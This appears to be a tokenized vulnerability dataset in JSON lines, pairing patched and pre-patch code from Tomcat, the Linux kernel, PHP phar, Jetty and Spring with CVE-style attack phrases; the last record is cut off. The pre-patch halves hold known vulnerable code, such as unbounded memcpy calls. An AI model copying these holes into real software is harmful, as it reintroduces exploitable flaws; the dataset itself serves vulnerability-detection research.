{"contents": ["empty"], "code_tokens": ["import", "org", ".", "apache", ".", "tomcat", ".", "util", ".", "security", ".", "PermissionCheck", ";", "implements", "Lifecycle", ",", "InstrumentableClassLoader", ",", "WebappProperties", ",", "PermissionCheck", "{", "@", "Override", "public", "boolean", "check", "(", "Permission", "permission", ")", "{", "if", "(", "!", "Globals", ".", "IS_SECURITY_ENABLED", ")", "{", "return", "true", ";", "}", "Policy", "currentPolicy", "=", "Policy", ".", "getPolicy", "(", ");", "if", "(", "currentPolicy", "!", "=", "null", ")", "{", "URL", "contextRootUrl", "=", "resources", ".", "getResource", "(", "\"/", "\")", ".", "getCodeBase", "(", ");", "CodeSource", "cs", "=", "new", "CodeSource", "(", "contextRootUrl", ",", "(", "Certificate", "[", "])", "null", ")", ";", "PermissionCollection", "pc", "=", "currentPolicy", ".", "getPermissions", "(", "cs", ")", ";", "if", "(", "pc", ".", "implies", "(", "permission", ")", ")", "{", "return", "true", ";", "}", "}", "return", "false", ";", "}", "import", "java", ".", "security", ".", "Permission", ";", "import", "java", ".", "util", ".", "PropertyPermission", ";", "import", "org", ".", "apache", ".", "tomcat", ".", "util", ".", "security", ".", "PermissionCheck", ";", "ClassLoader", "cl", "=", "Thread", ".", "currentThread", "(", ").", "getContextClassLoader", "(", ");", "if", "(", "cl", "instanceof", "PermissionCheck", ")", "{", "Permission", "p", "=", "new", "PropertyPermission", "(", "key", ",", "\"", "read", "\"", ");", "if", "(", "!(", "(", "PermissionCheck", ")", "cl", ")", ".", "check", "(", "p", ")", ")", "{", "return", "null", ";", "}", "}", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "tomcat", ".", "util", ".", "security", ";", "import", "java", ".", "security", ".", "Permission", ";", "/", "**", "*", "This", "interface", "is", "implemented", "by", "components", "to", "enable", "privileged", "code", "to", "*", "check", "whether", "the", "component", "has", "a", "given", "permission", ".", "*", "This", "is", "typically", "used", "when", "a", "privileged", "component", "(", "e", ".", "g", ".", "the", "container", ")", "is", "*", "performing", "an", "action", "on", "behalf", "of", "an", "untrusted", "component", "(", "e", ".", "g", ".", "a", "web", "*", "application", ")", "without", "the", "current", "thread", "having", "passed", "through", "a", "code", "source", "*", "provided", "by", "the", "untrusted", "component", ".", "Because", "the", "current", "thread", "has", "not", "*", "passed", "through", "a", "code", "source", "provided", "by", "the", "untrusted", "component", "the", "*", "SecurityManager", "assumes", "the", "code", "is", "trusted", "so", "the", "standard", "checking", "*", "mechanisms", "can", "'", "t", "be", "used", ".", "*", "/", "public", "interface", "PermissionCheck", "{", "/", "**", "*", "Does", "this", "component", "have", "the", "given", "permission", "?", "*", "*", "@", "param", "permission", "The", "permission", "to", "test", "*", "*", "@", "return", "{", "@", "code", "false", "}", "if", "a", "SecurityManager", "is", "enabled", "and", "the", "component", "*", "does", "not", "have", "the", "given", "permission", ",", "otherwise", "{", "@", "code", "false", "}", "*", "/", "boolean", "check", "(", "Permission", "permission", ")", ";", "}", "@", "@", "-", "109", ",", "6", "+", "109", ",", "14", "@", "@", "<", "add", ">", "Provide", "a", "mechanism", "that", "enables", "the", "container", "to", "check", "if", "a", "component", "(", "typically", "a", "web", "application", ")", "has", "been", "granted", "a", "given", "permission", "when", "running", "under", "a", "SecurityManager", "without", "the", "current", "execution", "stack", "having", "to", "have", "passed", "through", "the", "component", ".", "Use", "this", "new", "mechanism", "to", "extend", "SecurityManager", "protection", "to", "the", "system", "property", "replacement", "feature", "of", "the", "digester", ".", "(", "markt", ")", "<", "/", "add", "></s>implements", "Lifecycle", ",", "InstrumentableClassLoader", ",", "WebappProperties", "{"], "docstring_tokens": ["a", "malicious", "web", "application"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "flag", "&", "CL_UNPRIVILEGED", ")", "{", "mnt", "-", ">", "mnt", ".", "mnt_flags", "|", "=", "MNT_LOCK_ATIME", ";", "if", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_READONLY", ")", "mnt", "-", ">", "mnt", ".", "mnt_flags", "|", "=", "MNT_LOCK_READONLY", ";", "if", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_NODEV", ")", "mnt", "-", ">", "mnt", ".", "mnt_flags", "|", "=", "MNT_LOCK_NODEV", ";", "if", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_NOSUID", ")", "mnt", "-", ">", "mnt", ".", "mnt_flags", "|", "=", "MNT_LOCK_NOSUID", ";", "if", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_NOEXEC", ")", "mnt", "-", ">", "mnt", ".", "mnt_flags", "|", "=", "MNT_LOCK_NOEXEC", ";", "}", "if", "(", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_LOCK_NODEV", ")", "&", "&", "!", "(", "mnt_flags", "&", "MNT_NODEV", ")", ")", "{", "return", "-", "EPERM", ";", "}", "if", "(", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_LOCK_NOSUID", ")", "&", "&", "!", "(", "mnt_flags", "&", "MNT_NOSUID", ")", ")", "{", "return", "-", "EPERM", ";", "}", "if", "(", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_LOCK_NOEXEC", ")", "&", "&", "!", "(", "mnt_flags", "&", "MNT_NOEXEC", ")", ")", "{", "return", "-", "EPERM", ";", "}", "if", "(", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_LOCK_ATIME", ")", "&", "&", "(", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_ATIME_MASK", ")", "!", "=", "(", "mnt_flags", "&", "MNT_ATIME_MASK", ")", "))", "{", "return", "-", "EPERM", ";", "}", "mnt_flags", "|", "=", "MNT_NODEV", "|", "MNT_LOCK_NODEV", ";", "#", "define", "MNT_ATIME_MASK", "(", "MNT_NOATIME", "|", "MNT_NODIRATIME", "|", "MNT_RELATIME", ")", "#", "define", "MNT_LOCK_ATIME", "0x040000", "#", "define", "MNT_LOCK_NOEXEC", "0x080000", "#", "define", "MNT_LOCK_NOSUID", "0x100000", "#", "define", "MNT_LOCK_NODEV", "0x200000</s>if", "(", "(", "flag", "&", "CL_UNPRIVILEGED", ")", "&", "&", "(", "mnt", "-", ">", "mnt", ".", "mnt_flags", "&", "MNT_READONLY", ")", ")", "mnt", "-", ">", "mnt", ".", "mnt_flags", "|", "=", "MNT_LOCK_READONLY", ";", "mnt_flags", "|", "=", "MNT_NODEV", ";"], "docstring_tokens": ["via", "a", "\"mount", "-o", "remount", "\"", "command", "within", "a", "user", "namespace", "."]}
{"contents": ["empty"], "code_tokens": ["size_t", "len", ";", "tmp_len", "=", "MIN", "(", "MAXPATHLEN", ",", "entry", "-", ">", "filename_len", "+", "entry", "-", ">", "phar", "-", ">", "fname_len", ")", ";", "len", "=", "MIN", "(", "entry", "-", ">", "phar", "-", ">", "fname_len", ",", "tmp_len", ")", ";", "memcpy", "(", "tmp", ",", "entry", "-", ">", "phar", "-", ">", "fname", ",", "len", ")", ";", "len", "=", "MIN", "(", "tmp_len", "-", "len", ",", "entry", "-", ">", "filename_len", ")", ";", "memcpy", "(", "tmp", "+", "entry", "-", ">", "phar", "-", ">", "fname_len", ",", "entry", "-", ">", "filename", ",", "len", ")", ";", "-", "-", "TEST", "-", "-", "Phar", ":", "bug", "#", "69441", ":", "Buffer", "Overflow", "when", "parsing", "tar", "/", "zip", "/", "phar", "in", "phar_set_inode", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "phar", "\"", "))", "die", "(", "\"", "skip", "\"", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "fname", "=", "dirname", "(", "__FILE__", ")", ".", "'", "/", "bug69441", ".", "phar", "'", ";", "try", "{", "$", "r", "=", "new", "Phar", "(", "$", "fname", ",", "0", ")", ";", "}", "catch", "(", "UnexpectedValueException", "$", "e", ")", "{", "echo", "$", "e", ";", "}", "?", ">", "=", "=", "DONE", "=", "=", "-", "-", "EXPECTF", "-", "-", "exception", "'", "UnexpectedValueException", "'", "with", "message", "'", "phar", "error", ":", "corrupted", "central", "directory", "entry", ",", "no", "magic", "signature", "in", "zip", "-", "based", "phar", "\"", "%", "s", "/", "bug69441", ".", "phar", "\"", "'", "in", "%", "s", "/", "bug69441", ".", "php", ":", "%", "d", "Stack", "trace", ":", "#", "0", "%", "s", "/", "bug69441", ".", "php", "(", "%", "d", ")", ":", "Phar", "-", ">", "__construct", "(", "'%", "s", "'", ",", "0", ")", "#", "1", "{", "main", "}", "=", "=", "DONE", "=", "=</s>tmp_len", "=", "entry", "-", ">", "filename_len", "+", "entry", "-", ">", "phar", "-", ">", "fname_len", ";", "memcpy", "(", "tmp", ",", "entry", "-", ">", "phar", "-", ">", "fname", ",", "entry", "-", ">", "phar", "-", ">", "fname_len", ")", ";", "memcpy", "(", "tmp", "+", "entry", "-", ">", "phar", "-", ">", "fname_len", ",", "entry", "-", ">", "filename", ",", "entry", "-", ">", "filename_len", ")", ";"], "docstring_tokens": ["sending", "an", "overly", "long", "argument"]}
{"contents": ["empty"], "code_tokens": ["import", "java", ".", "net", ".", "URL", ";", "import", "java", ".", "net", ".", "URLClassLoader", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "/", "/", "The", "name", "of", "the", "odd", "-", "jar", "used", "for", "testing", "\"", "jar", ":", "file", ":", "//", "\"", "based", "resource", "access", ".", "private", "static", "final", "String", "ODD_JAR", "=", "\"", "jar", "-", "resource", "-", "odd", ".", "jar", "\"", ";", "File", "extraJarResources", "=", "MavenTestingUtils", ".", "getTestResourceFile", "(", "ODD_JAR", ")", ";", "URL", "urls", "[", "]", "=", "new", "URL", "[", "]", "{", "extraJarResources", ".", "toURI", "(", ").", "toURL", "(", ")", "}", ";", "ClassLoader", "parentClassLoader", "=", "Thread", ".", "currentThread", "(", ").", "getContextClassLoader", "(", ");", "URLClassLoader", "extraClassLoader", "=", "new", "URLClassLoader", "(", "urls", ",", "parentClassLoader", ")", ";", "context", ".", "setClassLoader", "(", "extraClassLoader", ")", ";", "/", "**", "*", "A", "regression", "on", "windows", "allowed", "the", "directory", "listing", "show", "*", "the", "fully", "qualified", "paths", "within", "the", "directory", "listing", ".", "*", "This", "test", "ensures", "that", "this", "behavior", "will", "not", "arise", "again", ".", "*", "/", "@", "Test", "public", "void", "testListingFilenamesOnly", "(", ")", "throws", "Exception", "{", "ServletHolder", "defholder", "=", "context", ".", "addServlet", "(", "DefaultServlet", ".", "class", ",", "\"", "/*", "\")", ";", "defholder", ".", "setInitParameter", "(", "\"", "dirAllowed", "\"", ",", "\"", "true", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "redirectWelcome", "\"", ",", "\"", "false", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "gzip", "\"", ",", "\"", "false", "\"", ");", "testdir", ".", "ensureEmpty", "(", ");", "/", "*", "create", "some", "content", "in", "the", "docroot", "*", "/", "File", "resBase", "=", "testdir", ".", "getFile", "(", "\"", "docroot", "\"", ");", "FS", ".", "ensureDirExists", "(", "resBase", ")", ";", "File", "one", "=", "new", "File", "(", "resBase", ",", "\"", "one", "\"", ");", "assertTrue", "(", "one", ".", "mkdir", "(", "))", ";", "File", "deep", "=", "new", "File", "(", "one", ",", "\"", "deep", "\"", ");", "assertTrue", "(", "deep", ".", "mkdir", "(", "))", ";", "FS", ".", "touch", "(", "new", "File", "(", "deep", ",", "\"", "foo", "\"", "))", ";", "assertTrue", "(", "new", "File", "(", "resBase", ",", "\"", "two", "\"", ").", "mkdir", "(", "))", ";", "assertTrue", "(", "new", "File", "(", "resBase", ",", "\"", "three", "\"", ").", "mkdir", "(", "))", ";", "String", "resBasePath", "=", "resBase", ".", "getAbsolutePath", "(", ");", "defholder", ".", "setInitParameter", "(", "\"", "resourceBase", "\"", ",", "resBasePath", ")", ";", "StringBuffer", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "one", "/", "deep", "/", "HTTP", "/", "1", ".", "0", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "n", "\"", ");", "String", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"/", "foo", "\"", ",", "response", ")", ";", "assertResponseNotContains", "(", "resBase", ".", "getAbsolutePath", "(", "),", "response", ")", ";", "}", "/", "**", "*", "A", "regression", "on", "windows", "allowed", "the", "directory", "listing", "show", "*", "the", "fully", "qualified", "paths", "within", "the", "directory", "listing", ".", "*", "This", "test", "ensures", "that", "this", "behavior", "will", "not", "arise", "again", ".", "*", "/", "@", "Test", "public", "void", "testListingFilenamesOnly_UrlResource", "(", ")", "throws", "Exception", "{", "URL", "extraResource", "=", "context", ".", "getClassLoader", "(", ").", "getResource", "(", "\"", "rez", "/", "one", "\"", ");", "assertNotNull", "(", "\"", "Must", "have", "extra", "jar", "resource", "in", "classloader", "\"", ",", "extraResource", ")", ";", "String", "extraResourceBaseString", "=", "extraResource", ".", "toURI", "(", ").", "toASCIIString", "(", ");", "extraResourceBaseString", "=", "extraResourceBaseString", ".", "substring", "(", "0", ",", "extraResourceBaseString", ".", "length", "(", ")", "-", "\"", "/", "one", "\"", ".", "length", "(", "))", ";", "ServletHolder", "defholder", "=", "context", ".", "addServlet", "(", "DefaultServlet", ".", "class", ",", "\"", "/", "extra", "/", "*\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "resourceBase", "\"", ",", "extraResourceBaseString", ")", ";", "defholder", ".", "setInitParameter", "(", "\"", "pathInfoOnly", "\"", ",", "\"", "true", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "dirAllowed", "\"", ",", "\"", "true", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "redirectWelcome", "\"", ",", "\"", "false", "\"", ");", "defholder", ".", "setInitParameter", "(", "\"", "gzip", "\"", ",", "\"", "false", "\"", ");", "StringBuffer", "req1", ";", "String", "response", ";", "/", "/", "Test", "that", "GET", "works", "first", ".", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "extra", "/", "one", "HTTP", "/", "1", ".", "0", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "n", "\"", ");", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"", "200", "OK", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"", "is", "this", "the", "one", "?", "\",", "response", ")", ";", "/", "/", "Typical", "directory", "listing", "of", "location", "in", "jar", ":", "file", ":", "//", "URL", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "extra", "/", "deep", "/", "HTTP", "/", "1", ".", "0", "\\", "r", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "r", "\\", "n", "\"", ");", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"", "200", "OK", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"/", "xxx", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"/", "yyy", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"/", "zzz", "\"", ",", "response", ")", ";", "assertResponseNotContains", "(", "extraResourceBaseString", ",", "response", ")", ";", "assertResponseNotContains", "(", "ODD_JAR", ",", "response", ")", ";", "/", "/", "Get", "deep", "resource", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "extra", "/", "deep", "/", "yyy", "HTTP", "/", "1", ".", "0", "\\", "r", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "r", "\\", "n", "\"", ");", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"", "200", "OK", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\"", "a", "file", "named", "yyy", "\"", ",", "response", ")", ";", "/", "/", "Convoluted", "directory", "listing", "of", "location", "in", "jar", ":", "file", ":", "//", "URL", "/", "/", "This", "exists", "to", "test", "proper", "encoding", "output", "req1", "=", "new", "StringBuffer", "(", ");", "req1", ".", "append", "(", "\"", "GET", "/", "context", "/", "extra", "/", "oddities", "/", "HTTP", "/", "1", ".", "0", "\\", "r", "\\", "n", "\"", ");", "req1", ".", "append", "(", "\"\\", "r", "\\", "n", "\"", ");", "response", "=", "connector", ".", "getResponses", "(", "req1", ".", "toString", "(", "))", ";", "assertResponseContains", "(", "\"", "200", "OK", "\"", ",", "response", ")", ";", "assertResponseContains", "(", "\">", "#", "hashcode", "&", "nbsp", ";", "<\"", ",", "response", ")", ";", "/", "/", "text", "on", "page", "assertResponseContains", "(", "\"/", "oddities", "/", "%", "23hashcode", "\"", ",", "response", ")", ";", "/", "/", "generated", "link", "assertResponseContains", "(", "\">", "other", "%", "2fkind", "%", "2Fof", "%", "2fslash", "&", "nbsp", ";", "<\"", ",", "response", ")", ";", "/", "/", "text", "on", "page", "assertResponseContains", "(", "\"/", "oddities", "/", "other", "%", "252fkind", "%", "252Fof", "%", "252fslash", "\"", ",", "response", ")", ";", "/", "/", "generated", "link", "assertResponseContains", "(", "\">", "a", "file", "with", "a", "space", "&", "nbsp", ";", "<\"", ",", "response", ")", ";", "/", "/", "text", "on", "page", "assertResponseContains", "(", "\"/", "oddities", "/", "a", "%", "20file", "%", "20with", "%", "20a", "%", "20space", "\"", ",", "response", ")", ";", "/", "/", "generated", "link", "assertResponseNotContains", "(", "extraResourceBaseString", ",", "response", ")", ";", "assertResponseNotContains", "(", "ODD_JAR", ",", "response", ")", ";", "}", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "/", "**", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "*", "/", "public", "static", "Resource", "newResource", "(", "String", "resource", ",", "boolean", "useCaches", ")", "*", "@", "param", "resource", "Resource", "as", "string", "representation", "*", "@", "param", "checkParents", "True", "if", "forced", "searching", "of", "parent", "Classloaders", "is", "performed", "to", "work", "around", "/", "**", "*", "@", "param", "uri", "the", "uri", "to", "encode", "*", "@", "return", "null", "(", "this", "is", "deprecated", ")", "*", "@", "deprecated", "use", "{", "@", "link", "URIUtil", "}", "or", "{", "@", "link", "UrlEncoded", "}", "instead", "*", "@", "throws", "IOException", "if", "unable", "to", "get", "the", "list", "of", "resources", "as", "HTML", "*", "@", "deprecated", "use", "{", "@", "link", "#", "getListHTML", "(", "String", ",", "boolean", ",", "String", ")", "}", "instead", "@", "Deprecated", "String", "name", "=", "item", ".", "getFileName", "(", ");", "if", "(", "StringUtil", ".", "isBlank", "(", "name", ")", ")", "continue", ";", "/", "/", "skip", "long", "lastModified", "=", "item", ".", "lastModified", "(", ");", "if", "(", "lastModified", ">", "0", ")", "{", "buf", ".", "append", "(", "dfmt", ".", "format", "(", "new", "Date", "(", "item", ".", "lastModified", "(", "))", "))", ";", "}", "buf", ".", "append", "(", "\"&", "nbsp", ";", "</", "td", ">", "\")", ";", "long", "length", "=", "item", ".", "length", "(", ");", "if", "(", "length", ">", "=", "0", ")", "{", "buf", ".", "append", "(", "String", ".", "format", "(", "\"%", ",", "d", "bytes", "\"", ",", "item", ".", "length", "(", "))", ");", "}", "buf", ".", "append", "(", "\"&", "nbsp", ";", "</", "td", ">", "</", "tr", ">", "\\", "n", "\"", ");", "/", "**", "*", "Get", "the", "raw", "(", "decoded", "if", "possible", ")", "Filename", "for", "this", "Resource", ".", "*", "This", "is", "the", "last", "segment", "of", "the", "path", ".", "*", "@", "return", "the", "raw", "/", "decoded", "filename", "for", "this", "resource", "*", "/", "private", "String", "getFileName", "(", ")", "{", "try", "{", "/", "/", "if", "a", "Resource", "supports", "File", "File", "file", "=", "getFile", "(", ");", "if", "(", "file", "!", "=", "null", ")", "{", "return", "file", ".", "getName", "(", ");", "}", "}", "catch", "(", "Throwable", "ignore", ")", "{", "}", "/", "/", "All", "others", "use", "raw", "getName", "try", "{", "String", "rawName", "=", "getName", "(", ");", "/", "/", "gets", "long", "name", "\"", "/", "foo", "/", "bar", "/", "xxx", "\"", "int", "idx", "=", "rawName", ".", "lastIndexOf", "(", "'/", "')", ";", "if", "(", "idx", "=", "=", "rawName", ".", "length", "(", ")-", "1", ")", "{", "/", "/", "hit", "a", "tail", "slash", ",", "aka", "a", "name", "for", "a", "directory", "\"", "/", "foo", "/", "bar", "/", "\"", "idx", "=", "rawName", ".", "lastIndexOf", "(", "'/", "',", "idx", "-", "1", ")", ";", "}", "String", "encodedFileName", ";", "if", "(", "idx", ">", "=", "0", ")", "{", "encodedFileName", "=", "rawName", ".", "substring", "(", "idx", "+", "1", ")", ";", "}", "else", "{", "encodedFileName", "=", "rawName", ";", "/", "/", "entire", "name", "}", "return", "UrlEncoded", ".", "decodeString", "(", "encodedFileName", ",", "0", ",", "encodedFileName", ".", "length", "(", "),", "UTF_8", ")", ";", "}", "catch", "(", "Throwable", "ignore", ")", "{", "}", "return", "null", ";", "}", "*", "@", "param", "out", "*", "@", "throws", "MalformedURLException</s>\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "+", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "+", "\"", "Connection", ":", "close", "\\", "r", "\\", "n", "\"", "+", "/", "**", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "*", "/", "public", "static", "Resource", "newResource", "(", "String", "resource", ",", "boolean", "useCaches", ")", "*", "@", "param", "resource", "Resource", "as", "string", "representation", "*", "@", "param", "checkParents", "True", "if", "forced", "searching", "of", "parent", "Classloaders", "is", "performed", "to", "work", "around", "/", "**", "*", "@", "deprecated", "String", "name", "=", "item", ".", "getName", "(", ");", "int", "slashIdx", "=", "name", ".", "lastIndexOf", "(", "'/", "')", ";", "if", "(", "slashIdx", "!", "=", "-", "1", ")", "name", "=", "name", ".", "substring", "(", "slashIdx", "+", "1", ")", ";", "buf", ".", "append", "(", "dfmt", ".", "format", "(", "new", "Date", "(", "item", ".", "lastModified", "(", "))", "))", ";", "buf", ".", "append", "(", "\"<", "/", "td", ">", "\")", ";", "buf", ".", "append", "(", "String", ".", "format", "(", "\"%", ",", "d", "\"", ",", "item", ".", "length", "(", "))", ");", "buf", ".", "append", "(", "\"", "bytes", "&", "nbsp", ";", "</", "td", ">", "</", "tr", ">", "\\", "n", "\"", ");", "*", "@", "param", "out", "*", "@", "throws", "MalformedURLException"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["private", "static", "final", "String", "PARSE_DEPTH_EXCEEDED", "=", "\"", "Trying", "to", "parse", "a", "path", "with", "depth", "greater", "than", "1000", "!", "This", "has", "been", "disabled", "for", "security", "reasons", "to", "prevent", "parsing", "overflows", ".", "\";", "if", "(", "base", ".", "size", "(", ")", ">", "1000", ")", "{", "throw", "new", "IllegalArgumentException", "(", "PARSE_DEPTH_EXCEEDED", ")", ";", "}", "*", "Copyright", "2011", "-", "2018", "the", "original", "author", "or", "authors", ".", "@", "Test", "/", "/", "DATACMNS", "-", "1285", "public", "void", "rejectsTooLongPath", "(", ")", "{", "String", "source", "=", "\"", "foo", ".", "bar", "\"", ";", "for", "(", "int", "i", "=", "0", ";", "i", "<", "9", ";", "i", "+", "+)", "{", "source", "=", "source", "+", "\"", ".\"", "+", "source", ";", "}", "assertThat", "(", "source", ".", "split", "(", "\"\\", "\\.", "\")", ".", "length", ",", "is", "(", "greaterThan", "(", "1000", ")", "))", ";", "final", "String", "path", "=", "source", ";", "exception", ".", "expect", "(", "IllegalArgumentException", ".", "class", ")", ";", "PropertyPath", ".", "from", "(", "path", ",", "Left", ".", "class", ")", ";", "}", "/", "/", "DATACMNS", "-", "1285", "private", "class", "Left", "{", "Right", "foo", ";", "}", "private", "class", "Right", "{", "Left", "bar", ";", "}</s>*", "Copyright", "2011", "-", "2017", "the", "original", "author", "or", "authors", "."], "docstring_tokens": ["sends", "a", "specially", "prepared", "form", "of", "a", "serialized", "object"]}
{"contents": ["empty"], "code_tokens": ["sb", ".", "append", "(", "escapeQuotationsInFilename", "(", "this", ".", "filename", ")", ").", "append", "(", "'\\", "\"'", ");", "private", "static", "String", "escapeQuotationsInFilename", "(", "String", "filename", ")", "{", "if", "(", "filename", ".", "indexOf", "(", "'\"", "')", "=", "=", "-", "1", "&", "&", "filename", ".", "indexOf", "(", "'\\", "\\'", ")", "=", "=", "-", "1", ")", "{", "return", "filename", ";", "}", "boolean", "escaped", "=", "false", ";", "StringBuilder", "sb", "=", "new", "StringBuilder", "(", ");", "for", "(", "char", "c", ":", "filename", ".", "toCharArray", "(", "))", "{", "sb", ".", "append", "(", "(", "c", "=", "=", "'", "\"'", "&", "&", "!", "escaped", ")", "?", "\"", "\\\\", "\\\"", "\"", ":", "c", ")", ";", "escaped", "=", "(", "!", "escaped", "&", "&", "c", "=", "=", "'", "\\\\", "')", ";", "}", "/", "/", "Remove", "backslash", "at", "the", "end", ".", ".", "if", "(", "escaped", ")", "{", "sb", ".", "deleteCharAt", "(", "sb", ".", "length", "(", ")", "-", "1", ")", ";", "}", "return", "sb", ".", "toString", "(", ");", "}", "Assert", ".", "notNull", "(", "input", ",", "\"", "`", "input", "`", "is", "required", "\"", ");", "Assert", ".", "notNull", "(", "charset", ",", "\"", "`", "charset", "`", "is", "required", "\"", ");", "Assert", ".", "isTrue", "(", "!", "StandardCharsets", ".", "US_ASCII", ".", "equals", "(", "charset", ")", ",", "\"", "ASCII", "does", "not", "require", "encoding", "\"", ");", "Assert", ".", "isTrue", "(", "UTF_8", ".", "equals", "(", "charset", ")", "|", "|", "ISO_8859_1", ".", "equals", "(", "charset", ")", ",", "\"", "Only", "UTF", "-", "8", "and", "ISO", "-", "8859", "-", "1", "supported", ".", "\")", ";", "this", ".", "filename", "=", "filename", ";", "Assert", ".", "hasText", "(", "filename", ",", "\"", "No", "filename", "\"", ");", "BiConsumer", "<", "String", ",", "String", ">", "tester", "=", "(", "input", ",", "output", ")", "-", ">", "{", "assertThat", "(", "builder", "(", "\"", "form", "-", "data", "\"", ").", "filename", "(", "input", ",", "StandardCharsets", ".", "US_ASCII", ")", ".", "build", "(", ").", "toString", "(", "))", ".", "isEqualTo", "(", "\"", "form", "-", "data", ";", "filename", "=", "\\\"", "\"", "+", "output", "+", "\"", "\\\"", "\")", ";", "}", ";", "tester", ".", "accept", "(", "\"", "foo", ".", "txt", "\\", "\\\"", ",", "\"", "foo", ".", "txt", "\"", ");", "tester", ".", "accept", "(", "\"", "foo", ".", "txt", "\\", "\\\\", "\\\"", ",", "\"", "foo", ".", "txt", "\\", "\\\\", "\\\"", ");", "tester", ".", "accept", "(", "\"", "foo", ".", "txt", "\\", "\\\\", "\\\\", "\\\"", ",", "\"", "foo", ".", "txt", "\\", "\\\\", "\\\"", ");</s>sb", ".", "append", "(", "this", ".", "filename", ")", ".", "append", "(", "'\\", "\"'", ");", "Assert", ".", "notNull", "(", "input", ",", "\"", "Input", "String", "should", "not", "be", "null", "\"", ");", "Assert", ".", "notNull", "(", "charset", ",", "\"", "Charset", "should", "not", "be", "null", "\"", ");", "if", "(", "StandardCharsets", ".", "US_ASCII", ".", "equals", "(", "charset", ")", ")", "{", "return", "input", ";", "}", "Assert", ".", "isTrue", "(", "UTF_8", ".", "equals", "(", "charset", ")", "|", "|", "ISO_8859_1", ".", "equals", "(", "charset", ")", ",", "\"", "Charset", "should", "be", "UTF", "-", "8", "or", "ISO", "-", "8859", "-", "1", "\"", ");", "this", ".", "filename", "=", "escapeQuotationMarks", "(", "filename", ")", ";", "private", "static", "String", "escapeQuotationMarks", "(", "String", "filename", ")", "{", "if", "(", "filename", ".", "indexOf", "(", "'\"", "')", "=", "=", "-", "1", ")", "{", "return", "filename", ";", "}", "boolean", "escaped", "=", "false", ";", "StringBuilder", "sb", "=", "new", "StringBuilder", "(", ");", "for", "(", "char", "c", ":", "filename", ".", "toCharArray", "(", "))", "{", "sb", ".", "append", "(", "(", "c", "=", "=", "'", "\"'", "&", "&", "!", "escaped", 